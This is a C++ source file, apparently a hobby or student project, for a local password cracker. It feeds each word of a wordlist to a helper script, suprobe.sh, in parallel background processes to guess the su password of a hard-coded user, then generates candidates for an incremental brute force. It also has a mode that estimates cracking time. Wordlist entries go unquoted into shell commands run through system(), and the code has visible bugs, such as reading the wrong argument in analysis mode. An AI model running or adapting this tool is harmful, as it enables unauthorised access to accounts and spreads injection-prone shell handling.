#include <iostream>
#include <fstream>
#include <string>
#include <unordered_map>
#include <vector>
#include <cmath>
#include <unistd.h>
#include <algorithm>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>


using namespace std;

string USERNAME = "Bob";
int MAX_VALID_ASCII = 126;
int PROC_CAP = 600; //How many processes do we think it can handle at once?
long MEM_DESIRED = 2000000;
int MIN_VALID_ASCII = 33;
int MAX_PROC = 700; //will hold the number of processes we can have at once

unordered_map <string, int> HT;
vector <string> pwds;
vector <char> vctoi;




string exec(const char* cmd) {
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

long long string_to_int(string s){
        unsigned long long sum = 0;
        for(int i = 0; i <= s.length()-1; i++){
                sum +=(long long) (s[i]-MIN_VALID_ASCII)*(long long)pow(MAX_VALID_ASCII-MIN_VALID_ASCII,s.length()-i-1);
        }
        cout << errno << endl;
        return sum;
}

string int_to_string(long long l){
        string s = "";
        for(int i = 1; l > 0; i++){
                char c = vctoi[(l%((long long)(pow(vctoi.size(),i))))];
                s.push_back(c);
                l=l/(pow(vctoi.size(),i));
        }
        reverse(s.begin(), s.end());
        return s;
}

int main(int argc, char **argv){
    pwds.push_back(""); //Just in case user has no password
    cout << getpid() << endl;

    //Generate vctoi
    for(int i = 0; i <= 9; i++){
            vctoi.push_back((char)(i+'0')); // adds 0-9
    }
    for(int i = 0; i < 26; i++){
            vctoi.push_back((char)(i+'A')); // adds A-Z
            vctoi.push_back((char)(i+'a')); // adds a-z
    }

    //Ideally, print an error message if user fails to run program correctly 
    cout << "Usage: ./a.out passwords.txt <optional: password>" << endl;

    //Figure out how many procs we can have at once
    //this gets the total number of processes we can have as the user
    //do we care about the total number of processes or procs?
    system("nproc >> process.txt");
    ifstream process_file;
    process_file.open("process.txt");
    //process_file >> MAX_PROC;
    printf("%d is the max proc\n", MAX_PROC);



    //Initialize Dictionary 
    ifstream pwd_file;
    pwd_file.open(argv[1]);
    if(!pwd_file.is_open()){
        cout << "Invalid file\n";
        return(1);
    }
        string pwd;
    int num = 1;
    while (pwd_file >> pwd) {
            HT[pwd] = num;        //use HT[pwd] to get index
            pwds.push_back(pwd);  //use pwds[index] to get pwd
            num++;
    }
    int DICT_SIZE = num;

	//load entire dictionary in an array and seperately in a hash table
	// HashTable HT;
	// if (HT.isEmpty()) {
	// 	cout << "Empty Hash!" << endl;
	// } else {
	// 	cout << "Not Empty!" << endl;
	// }
	// string pwd;
	// int num = 0;
	// while (cin >> pwd) {
	// 	HT.insertItem(num, pwd);
	// 	num++;
    // }
	
    // Print Entire Dictionary
    // HT.printTable();


     //PASSWORD ANALYSIS MODE:
        //If password is in dictionary, do math to tell user how long it would take 
        //If not, do math to tell user how long it would take to dial up to their password
    if(argc==3){
        cout << "Analysis Mode: \n";
        long long time = 0;
        if(HT[argv[1]] != 0){
                time = HT[argv[1]] * 3 / MAX_PROC;
        }else time = (string_to_int(argv[1]) + DICT_SIZE) * 3 / MAX_PROC;
        cout << "It would take " << time << " seconds to crack your password.\n";
        return(0);
    }





        //PASSWORD CRACKING MODE:
    system("rm su.txt; install -m 666 /dev/null su.txt"); //writeable file for storing password
    for(int i = 0; i <= DICT_SIZE; i++){ //Keeps procs from trying the same words
        while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
                //cout << mem_left() << endl;
                usleep (1000000); //Avoid fork bombing yourself
        }
        const string cmd = "bash suprobe.sh " + pwds[i] +' '+ USERNAME + ' ' + to_string(getpid()) + " >/dev/null 2>/dev/null &";
        system(cmd.c_str());
    }
    //If we make it this far, password was not in dict;
    for(long long i = 0; i < 10000000000; i++){ //If we try long enough, give up
        //Test Password
        pwd=int_to_string(i);
        const string cmd = "bash suprobe.sh " + pwd + ' ' + USERNAME + ' ' + to_string(getpid()) + ">/dev/null 2>/dev/null &";
        //system(cmd.c_str());
        cout << pwd << endl;
        //Attempt to keep procs under PROC_CAP
        while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
                //cout << mem_left() << endl;
                usleep (1000000); //Avoid fork bombing yourself
        }
    }


    return 0;

}

